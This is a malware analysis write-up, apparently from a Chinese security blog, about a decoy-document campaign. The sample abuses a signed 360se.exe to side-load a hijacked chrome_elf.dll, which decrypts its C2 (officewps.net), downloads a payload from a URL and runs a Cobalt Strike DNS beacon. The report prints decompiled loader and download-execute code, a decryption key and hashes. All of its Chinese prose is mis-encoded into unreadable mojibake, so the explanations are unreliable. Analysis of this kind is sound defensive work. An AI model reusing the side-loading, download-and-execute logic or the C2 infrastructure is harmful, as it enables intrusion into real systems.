**æ³¨å†Œè¡¨æ“ä½œï¼š**

```
è¿›è¡Œæ³¨å†Œè¡¨ï¼š
å‘æ³¨å†Œè¡¨Software\Classes\docxfile\shell\open\command
å†™å…¥%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE



$-6C     > 00446260  UNICODE "Software\Classes.docx"

$-94     > 80000002  |hKey = HKEY_LOCAL_MACHINE
$-90     > 00446298  |Subkey = "Software\Classes.docx"
$-8C     > 00000000  |Reserved = 0x0
$-88     > 00020019  |Access = KEY_READ
$-84     > 0036F940  \pHandle = 0036F940

æ¡ä»¶ä¸ºçœŸ TRUE
å †æ ˆ ss:[0036FA9C]=00448FB0, (UNICODE "Software\Classes\docxfile\shell\open\command")
eax=0036FA9C, (UNICODE "è¾°D")

$-8      > 00447810  UNICODE ""%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE"


éƒ¨åˆ†ä»£ç ç‰‡æ®µï¼š

v5 = sub_1000BBA0(&v71, L"Software\\Classes\\", (int)&v63);
LOBYTE(v77) = 4;
sub_1000BC90(&v68, v5, L"\\shell\\open\\command");
LOBYTE(v77) = 6;
if ( v73 >= 8 )
j__free(v71);
v50 = (signed int)&phkResult;
LOWORD(v71) = 0;
v49 = 131097;
v6 = &v68;
if ( v70 >= 8 )
v6 = (void *)v68;
v73 = 7;
v72 = 0;



73B9EAB8=wwlib.73B9EAB8 (UNICODE "Software\Microsoft\Windows\CurrentVersion\Explorer")
edx=73B9EAB8 (wwlib.73B9EAB8), UNICODE "Software\Microsoft\Windows\CurrentVersion\Explorer"
```



**360se.exeè°ƒç”¨**

åˆ¤æ–­æ³¨å†Œè¡¨æ˜¯å¦å­˜åœ¨docé¡¹ï¼Œè‹¥å­˜åœ¨åˆ™ è°ƒç”¨ word ä½œä¸ºä¼ªè£… å’Œ 360se.exeè¿›è¡Œä¸‹ä¸€é˜¶æ®µæ¶æ„è°ƒç”¨

```c
æ³¨å†Œè¡¨é¡¹å€¼ï¼š
$-1C     > 0044782E  UNICODE "\Windows NT\Accessories\WORDPAD.EXE" "%1""
å¯åŠ¨wordä¼ªè£…é¡¹å€¼
$-5C     > 0044D028  UNICODE ""%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE"
$-40     > 004463B0  UNICODE ""2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docx""
$-18     > 00451638  UNICODE ""C:\Program Files (x86)\Windows NT\Accessories\WOR"
    "%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE" "%1"

é€šè¿‡ WORDPAD.EXE  å¯åŠ¨word æ–‡æ¡£ï¼ˆåœ¨HKEY_LOCAL_MACHINEå­˜åœ¨æ—¶ï¼‰
$-A0     > 00000000  |ModuleFileName = NULL
$-9C     > 0044CFB0  |CommandLine = ""C:\Program Files (x86)\Windows NT\Accessories\WORDPAD.EXE"  "2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docx" "
$-98     > 00000000  |pProcessSecurity = NULL
$-94     > 00000000  |pThreadSecurity = NULL
$-90     > 00000000  |InheritHandles = FALSE
$-8C     > 00000000  |CreationFlags = 0
$-88     > 00000000  |pEnvironment = NULL
$-84     > 00000000  |CurrentDir = NULL
$-80     > 0036F92C  |pStartupInfo = 0036F92C
$-7C     > 0036F974  \pProcessInfo = 0036F974

åœ¨å­˜åœ¨HKEY_CURRENT_USERä¸­é¡¹å€¼æ—¶è°ƒç”¨360se.exe  â€œ2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docxâ€

sub_1000BBA0(&lpSubKey, L"Software\\Classes\\", (int)&v57);
  LOBYTE(v77) = 1;
  v50 = (signed int)&phkResult;
  v49 = 131097;
  v4 = &lpSubKey;
  if ( v67 >= 8 )
    v4 = (void *)lpSubKey;
  if ( !RegOpenKeyExW(HKEY_CURRENT_USER, (LPCWSTR)v4, 0, v49, (PHKEY)v50) )//é¡¹å€¼åˆ¤æ–­
  {
    v51 = &v45;
    v50 = 7;
    v49 = 0;
    LOWORD(v45) = 0;
    sub_1000B200((int)&v45, (void *)&ValueName, 0);
    LOBYTE(v77) = 2;
    v44 = 7;
    v43 = 0;
    v39 = 0;
    sub_1000A5D0(&v39, (int)&lpSubKey, 0, -1);
    LOBYTE(v77) = 1;
    sub_10003560(
      &v63,
      HKEY_CURRENT_USER,
      *(LPCWSTR *)&v39,
      v40,
      v41,
      v42,
      v43,
      v44,
      (LPCWSTR)v45,
      v46,
      v47,
      v48,
      v49,
      v50);
    LOBYTE(v77) = 3;
    v5 = sub_1000BBA0(&v71, L"Software\\Classes\\", (int)&v63); //è¯»å–è°ƒç”¨å‚æ•°
    LOBYTE(v77) = 4;
    sub_1000BC90(&v68, v5, L"\\shell\\open\\command");
    LOBYTE(v77) = 6;
    if ( v73 >= 8 )
      j__free(v71);
    v50 = (signed int)&phkResult;
    LOWORD(v71) = 0;
    v49 = 131097;
    v6 = &v68;
    if ( v70 >= 8 )
      v6 = (void *)v68;
    v73 = 7;
    v72 = 0;
    if ( !RegOpenKeyExW(HKEY_CURRENT_USER, (LPCWSTR)v6, 0, v49, (PHKEY)v50) )
    {
      hKey = (HKEY)&v45;
      sub_10009F70((int)&v45, (void *)&ValueName);
      LOBYTE(v77) = 7;
      v44 = 7;
      v43 = 0;
      v39 = 0;
      sub_1000A5D0(&v39, (int)&v68, 0, -1);
      LOBYTE(v77) = 6;
      sub_10003560(
        &v74,
        HKEY_CURRENT_USER,
        *(LPCWSTR *)&v39,
        v40,
        v41,
        v42,
        v43,
        v44,
        (LPCWSTR)v45,
        v46,
        v47,
        v48,
        v49,
        v50);
      LOBYTE(v77) = 8;
      v7 = sub_1000A7D0(&v74, (int)L"/dde", 0x400000000ui64);
      v8 = v75;
      if ( (signed int)v7 > 0 && v7 < v75 )
      {
        v9 = sub_1000A2D0((int)&v74, (int)&v71, 0, v7);
        sub_1000A040(&v74, (void *)v9);
        if ( v73 >= 8 )
          j__free(v71);
        sub_1000A140(L"\"%1\"");
        v8 = v75;
      }
      if ( v8 <= 1 )
        goto LABEL_49;
      v10 = sub_1000A7D0(&v74, (int)L"%1", 0x200000000ui64);
      v11 = v10;
      if ( v10 <= 0 || v10 >= v8 )
        goto LABEL_49;
      sub_1000A2D0((int)&v74, (int)&v60, 0, v10 - 1);
      LOBYTE(v77) = 9;
      sub_1000A2D0((int)&v74, (int)&v61, v11 + 3, -1);
      LOBYTE(v77) = 10;
      v12 = (void *)sub_1000BD30(&v54, L" ");
      LOBYTE(v77) = 11;
      v13 = (int)sub_1000BE20(&v55, v12, (int)&dword_10022178);
      LOBYTE(v77) = 12;
      v14 = sub_1000BC90(&v56, v13, L" ");
      LOBYTE(v77) = 13;
      sub_1000BE20(&v71, v14, (int)&v61);
      sub_1000A0C0((int)&v56);
      sub_1000A0C0((int)&v55);
      LOBYTE(v77) = 17;
      sub_1000A0C0((int)&v54);
      sub_10009F20(&v71);
      v15 = sub_10003B30(v45, v46, v47, v48, v49, v50);
      sub_1000A040(&v71, (void *)v15);
      sub_1000A0C0((int)&v62);
      sub_10009F20(&v71);
      sub_10003E80((LPWSTR)v45, v46, v47, v48, v49, v50);// createprocess è°ƒç”¨360se.exe       
      sub_1000A0C0((int)&v71);
      sub_1000A0C0((int)&v61);
      v16 = (int)&v60;
      goto LABEL_48;
    }

```



##### 360se.exeç™½åˆ©ç”¨

| SHA-256   | de6c5cfff542f1b204c32c303a9c74b47b124a670ea0a62429d0021e268a2872 |
| --------- | ------------------------------------------------------------ |
| MD5       | a16702ed1812ddc42153ef070f3dfdd6                             |
| File name | 360se.exe                                                    |
| File size | 1.02 MB                                                      |
| File Type | Win32 EXE                                                    |

> è¯ä¹¦ä¿¡æ¯ä¸ºï¼š
>
> Qihoo 360 Software (Beijing) Company Limited
>
> 2018â€å¹´â€1â€æœˆâ€26â€æ—¥ 20:18:05
>
> æœ‰æ•ˆæœŸä»2015/12/28åˆ° 2019/3/29

é€šè¿‡åˆ©ç”¨360se.exe ä¸­çš„ å¯¹ å‡½æ•°è°ƒç”¨ åŠ è½½ åŒç›®å½•ä¸‹çš„è¢«åŠ«æŒçš„ chrome_elf.dll è°ƒç”¨å…¶è¢«ç¯¡æ”¹çš„å‡½æ•°SignalInitializeCrashReporting

```c
è°ƒç”¨éƒ¨åˆ†çš„ chromeMain ä¸»è¦åŠŸèƒ½å‡½æ•°
signed int __stdcall sub_404CE2(int a1, int a2, int a3, int a4)
{
  int v4; // ebx@1
  DWORD v5; // esi@1
  DWORD v6; // eax@1
  char *v7; // ecx@2
  HMODULE v8; // eax@7
  void (*v9)(void); // eax@8
  int v10; // esi@10
  int v11; // edi@12
  HANDLE v12; // eax@13
  void (*v13)(void); // eax@15
  int v14; // eax@17
  signed int v15; // ecx@23
  int v16; // esi@24
  HMODULE v17; // eax@28
  void (*v18)(void); // eax@28
  WCHAR *v20; // ecx@41
  WCHAR v21; // ax@42
  char v22; // al@58
  int v23; // ecx@60
  char v24; // bl@62
  int v25; // ecx@68
  int v26; // ecx@72
  signed int v27; // esi@72
  int v28; // edi@84
  int v29; // eax@86
  int v30; // eax@86
  int v31; // ecx@90
  UINT v32; // edi@92
  HANDLE v33; // eax@94
  int v34; // esi@100
  int v35; // eax@100
  int v36; // [sp+36h] [bp-920h]@51
  unsigned int v37; // [sp+3Ah] [bp-91Ch]@1
  int v38; // [sp+3Eh] [bp-918h]@17
  int v39; // [sp+42h] [bp-914h]@17
  char v40; // [sp+56h] [bp-900h]@17
  int v41; // [sp+5Ah] [bp-8FCh]@17
  char v42; // [sp+5Eh] [bp-8F8h]@64
  int v43; // [sp+7Eh] [bp-8D8h]@1
  char v44; // [sp+86h] [bp-8D0h]@58
  char v45; // [sp+9Eh] [bp-8B8h]@14
  char v46; // [sp+B6h] [bp-8A0h]@12
  int v47; // [sp+C6h] [bp-890h]@12
  char v48; // [sp+CEh] [bp-888h]@61
  int v49; // [sp+DEh] [bp-878h]@84
  int v50; // [sp+E2h] [bp-874h]@84
  int v51; // [sp+E6h] [bp-870h]@58
  int v52; // [sp+F6h] [bp-860h]@84
  int v53; // [sp+FAh] [bp-85Ch]@84
  char v54; // [sp+FEh] [bp-858h]@58
  __int64 ThreadId; // [sp+116h] [bp-840h]@12
  char v56; // [sp+11Fh] [bp-837h]@58
  char v57[2]; // [sp+124h] [bp-832h]@2
  WCHAR Filename[260]; // [sp+126h] [bp-830h]@1
  WCHAR pszPath; // [sp+32Eh] [bp-628h]@40
  __int16 v60; // [sp+330h] [bp-626h]@43
  WCHAR LibFileName; // [sp+53Eh] [bp-418h]@1
  char v62; // [sp+746h] [bp-210h]@1

  v4 = a1;
  v37 = 0;
  v43 = a1;
  sub_46C650(&LibFileName, 0, 520);
  sub_46C650(Filename, 0, 520);
  v5 = GetModuleFileNameW(0, Filename, 0x104u);
  sub_46C650(&v62, 0, 520);
  sub_404051();
  v6 = 0;
  if ( v5 )
  {
    v7 = &v57[2 * v5];
    while ( *(_WORD *)v7 != 92 )
    {
      ++v6;
      v7 -= 2;
      if ( v6 >= v5 )
        goto LABEL_5;
    }
    v16 = v5 - v6;
    if ( (unsigned int)(v16 * 2) >= 0x208 )
    {
      sub_4695CB();
      __debugbreak();
      JUMPOUT(*(_DWORD *)sub_405746);
    }
    Filename[v16] = 0;
  }
LABEL_5:
  sub_4067EF(&LibFileName, 260, (const char *)L"%s%s\\chrome_elf.dll", (unsigned int)Filename);  // è°ƒç”¨åŒçº§ç›®å½•ä¸‹çš„chrome_elf.dll
  if ( sub_4720EE(&LibFileName, 0) == -1 )
    sub_4067EF(&LibFileName, 260, (const char *)L"%schrome_elf.dll", Filename);
  v8 = LoadLibraryW(&LibFileName);
  if ( v8 )
  {
    v9 = (void (*)(void))GetProcAddress(v8, "SignalInitializeCrashReporting");
    //è°ƒç”¨å‡½æ•° SignalInitializeCrashReporting
    if ( v9 )
      v9();
  }
  v10 = dword_4C6C90;
  if ( !dword_4C6C90 )
  {
    sub_4114E0();
    v10 = dword_4C6C90;
  }
  LODWORD(ThreadId) = "type";
  HIDWORD(ThreadId) = sub_40129C("type");
  sub_411D20(&v46, &ThreadId);
  sub_403D80();
  v11 = v47;
  if ( !v47 )
  {
    LODWORD(ThreadId) = 0;
    v12 = CreateThread(0, 0, sub_404B39, 0, 0, (LPDWORD)&ThreadId);
    CloseHandle(v12);
  }
  sub_41B730(&ThreadId);
  sub_4019CA(L"chrome_elf.dll");
  LODWORD(ThreadId) = sub_40402A(&v45);
  sub_401A47(1, 0);
  if ( (_DWORD)ThreadId )
  {
    v13 = (void (*)(void))GetProcAddress((HMODULE)ThreadId, "SignalChromeElf");
    if ( v13 )
      v13();
  }
  sub_425450(&v38);
  sub_41B220(&v39);

```



è¿›è¡ŒC2è§£å¯†åŠåé—¨é‡Šæ”¾

| SHA256   | a2d2b9a05ed5b06db8e78b4197fc5ea515f26d5626d85f3b1b39210d50552af3 |
| -------- | ------------------------------------------------------------ |
| MD5      | 3b132e407474bc1c830d5a173428a6e1                             |
| æ–‡ä»¶æ ¼å¼ | DLL                                                          |
| æ–‡ä»¶å   | chrome_elf.dll                                               |
| æ–‡ä»¶å¤§å° | 191KB                                                        |

chrome_elf.dll åœ¨DLLMain å³loadlibray åˆå§‹åŒ– ä¸­åŒæ—¶è°ƒç”¨ ç›¸åŒçš„è§£å¯†æ–¹æ³•ï¼ˆè§åŠ è§£å¯†è¯´æ˜ï¼‰ï¼Œè¿›è¡Œåé—¨è§£å¯†

```
ç§˜é’¥
.rdata:10024848 qword_10024848  dq 6D754E406E214843h    ; DATA XREF: sub_10001300+40r
.rdata:10024850 qword_10024850  dq 5352306631723338h    ; DATA XREF: sub_10001300+56r
.rdata:10024858 qword_10024858  dq 6B304A306E337275h    ; DATA XREF: sub_10001300+67r

https://officewps.net/ultra.jpg

C2ï¼šofficewps.net
```

åœ¨ SignalInitializeCrashReporting å‡½æ•°è°ƒç”¨æ—¶

```c
void __noreturn SignalInitializeCrashReporting()
{
  void **v0; // edx@2
  int v1; // ecx@5
  __int16 v2; // [sp-18h] [bp-40h]@4
  int v3; // [sp-14h] [bp-3Ch]@7
  int v4; // [sp-10h] [bp-38h]@7
  int v5; // [sp-Ch] [bp-34h]@7
  SIZE_T v6; // [sp-8h] [bp-30h]@4
  int v7; // [sp-4h] [bp-2Ch]@4
  int v8; // [sp+Ch] [bp-1Ch]@8
  unsigned int v9; // [sp+1Ch] [bp-Ch]@7

  if ( !sub_10001870() )   //åˆ¤æ–­æ˜¯å¦å­˜åœ¨360se.exe è¿›ç¨‹
  {
    v0 = &dword_100289F8;
    if ( (unsigned int)dword_10028A0C >= 8 )
      v0 = (void **)dword_100289F8;
    v7 = 7;
    v6 = 0;
    v2 = 0;
    if ( *(_WORD *)v0 )
      v1 = wcslen((const unsigned __int16 *)v0);
    else
      v1 = 0;
    sub_10004070((int)&v2, v0, v1);
    sub_10001E80(*(LPCWSTR *)&v2, v3, v4, v5, v6, v7); //è°ƒç”¨URL ä¸‹è½½åé—¨
    if ( v9 > 0xA )
    {
      v7 = 15;
      v6 = 0;
      LOBYTE(v2) = 0;
      sub_100032A0((int)&v8, 0, 0xFFFFFFFF);
      sub_10002040(*(void **)&v2, v3, v4, v5, v6, v7); //æ‰§è¡Œåé—¨payload 
    }
    Sleep(0xFFFFFFFF);
  }
  ExitProcess(1u);
}


åˆ¤æ–­360se.exeæ˜¯å¦è¿è¡Œ
  pe.dwSize = 556;
  v1 = CreateToolhelp32Snapshot(2u, 0);
  if ( Process32FirstW(v1, &pe) && Process32NextW(v1, &pe) )
  {
    while ( 1 )
    {
      if ( !_wcsicmp(pe.szExeFile, L"360se.exe") )
      {
        ++v0;
        if ( v0 == 4 )
          break;
      }
      if ( !Process32NextW(v1, &pe) )
        goto LABEL_6;



æ ·æœ¬ä¸‹è½½ï¼š
  v8 = InternetOpenW(L"update", 0, 0, 0, 0);
  v9 = &lpszUrl;
  if ( (unsigned int)a6 >= 8 )
    v9 = (void *)lpszUrl;
  hInternet = v8;
  v10 = InternetOpenUrlW(v8, (LPCWSTR)v9, 0, 0, 0, 0);
  if ( v10 && dwNumberOfBytesRead )
  {
    do
    {
      InternetReadFile(v10, &Buffer, 0x400u, &dwNumberOfBytesRead);


```



åé—¨é‡‡ç”¨çš„æ˜¯

Cobalt Strikeä¹‹DNS Beacon  å³ DNS é€šä¿¡åé—¨

é€šä¿¡æŒ‡ä»¤é‡‡ç”¨æ•°å­—è¡¨ç¤ºï¼Œé’ˆå¯¹DNSéš§é“é€šä¿¡åç»­è¿›è¡Œä¸“é—¨è¯†åˆ«ã€‚




å‚è€ƒé“¾æ¥ï¼š

https://www.freebuf.com/articles/network/201836.html
https://www.freebuf.com/sectool/127125.html
